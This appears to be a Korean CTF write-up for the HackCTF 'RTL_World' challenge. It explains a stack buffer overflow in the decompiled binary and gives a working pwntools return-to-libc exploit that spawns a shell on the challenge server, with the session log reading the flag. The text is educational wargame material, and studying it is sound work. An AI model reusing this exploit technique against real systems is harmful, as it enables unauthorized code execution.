# RTL_World

```c
kimdong@ubuntu  ~/Wargame/200~250  file rtl_world
rtl_world: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=8c8517ab9344393e62869f9fa9aad2de42e5a6b1, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec rtl_world
[*] '/home/kimdong/Wargame/200~250/rtl_world'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리 파일은 32bit에 NX BIT외에는 다른 mitigation은 걸려있지 않다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./rtl_world
[1]    2285 segmentation fault (core dumped)  ./rtl_world

✘ kimdong@ubuntu  ~/Wargame/200~250  nc ctf.j0n9hyun.xyz 3010

NPC [Village Presient] :
Binary Boss made our village fall into disuse...
If you Have System Armor && Shell Sword.
You can kill the Binary Boss...
Help me Pwnable Hero... :(

Your Gold : 1000
======= Welcome to RTL World =======
1) Information the Binary Boss!
2) Make Money
3) Get the System Armor
4) Get the Shell Sword
5) Kill the Binary Boss!!!
6) Exit
====================================
>>>

```
Local에서 실행시키면  core dumped가 뜨고, nc로 연결하면 아래와 같은 문자열이 출력된다.<br>
```c
[Binary Boss]

Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
ASLR:  Enable
Binary Boss live in 0xf7fb8468
Binart Boss HP is 140 + Armor + 4
```
1)번을 선택하면 다음과 같이 바이너리에 대한 정보가 나온다.<br>
`Binary Boss`의 주소와 HP(?)를 알려준다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // [esp+0h] [ebp-A0h]
  int v5; // [esp+10h] [ebp-90h]
  char buf; // [esp+14h] [ebp-8Ch]
  void *v7; // [esp+94h] [ebp-Ch]
  void *handle; // [esp+98h] [ebp-8h]
  void *s1; // [esp+9Ch] [ebp-4h]

  setvbuf(stdout, 0, 2, 0);
  handle = dlopen("/lib/i386-linux-gnu/libc.so.6", 1);
  v7 = dlsym(handle, "system");
  dlclose(handle);
  for ( s1 = v7; memcmp(s1, "/bin/sh", 8u); s1 = (char *)s1 + 1 )
    ;
  puts("\n\nNPC [Village Presient] : ");
  puts("Binary Boss made our village fall into disuse...");
  puts("If you Have System Armor && Shell Sword.");
  puts("You can kill the Binary Boss...");
  puts("Help me Pwnable Hero... :(\n");
  printf("Your Gold : %d\n", gold);
  while ( 1 )
  {
    Menu(v4);
    printf(">>> ");
    __isoc99_scanf("%d", &v5);
    switch ( v5 )
    {
      case 0:
        continue;
      case 1:
        system("clear");
        puts("[Binary Boss]\n");
        puts("Arch:     i386-32-little");
        puts("RELRO:    Partial RELRO");
        puts("Stack:    No canary found");
        puts("NX:       NX enabled");
        puts("PIE:      No PIE (0x8048000)");
        puts("ASLR:  Enable");
        printf("Binary Boss live in %p\n", handle);
        puts("Binart Boss HP is 140 + Armor + 4\n");
        break;
      case 2:
        v4 = gold;
        Get_Money();
        break;
      case 3:
        if ( gold <= 1999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 1999;
          printf("System Armor : %p\n", v7);
        }
        break;
      case 4:
        if ( gold <= 2999 )
        {
          puts("You don't have gold... :(");
        }
        else
        {
          gold -= 2999;
          printf("Shell Sword : %p\n", s1);
        }
        break;
      case 5:
        printf("[Attack] > ");
        read(0, &buf, 0x400u);
        return 0;
      case 6:
        puts("Your Not Hero... Bye...");
        exit(0);
        return result;
    }
  }
}
```  
`case 5`에서 보면 사용자의 입력값을 받는데, buf의 크기는 140인데, 1024byte를 받는 것을 확인할 수 있다.<br>
`BOF`취약점을 이용할건데, NX-bit가 enable 되어있으므로, system함수 주소에서 /bin/sh를 실행시키는 방법으로 가야 할것같다.<br>


```c
gef➤  disas system
Dump of assembler code for function system@plt:
   0x080485b0 <+0>:	jmp    DWORD PTR ds:0x804b020
   0x080485b6 <+6>:	push   0x28
   0x080485bb <+11>:	jmp    0x8048550
End of assembler dump.

```
`system`함수의 주소는 `0x080485b0`이다.

```c
.rodata:08048EB1 aBinSh          db '/bin/sh',0          ; DATA XREF: main+84↑o
```
ida를 통해 `/bin/sh`의 주소를 구했는데, `0x08048EB1`이다.<br>

Exploit Code는 다음과 같다.<br>

5번분기를 호출한뒤에, Buf + SFP + system + dummy(exit) + /bin/sh의 payload를 전송해주면 될것같다.<br>

system함수뒤에 4바이트 더미와 /bin/sh를 넣어주는 이유<br>
- system, execl함수는 ebp+8을 인자로 인식한다. 때문에 exit함수나 4바이트의 dummy값을 넣어준다.<br>

---

## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3010)
context.log_level = 'debug'

system_addr=0x080485b0
bin_sh_addr=0x08048eb1

p.recvuntil(">>> ")
p.sendline("5")
p.recvuntil("[Attack] > ")
payload = "A"*144
payload += p32(system_addr)
payload += "A"*4
payload += p32(bin_sh_addr)
p.sendline(payload)
p.interactive()
```

```c
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0xa bytes:
    'flag\n'
    'main\n'
flag
main
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x22 bytes:
    'HackCTF{}\n'
HackCTF{}
```

## END !
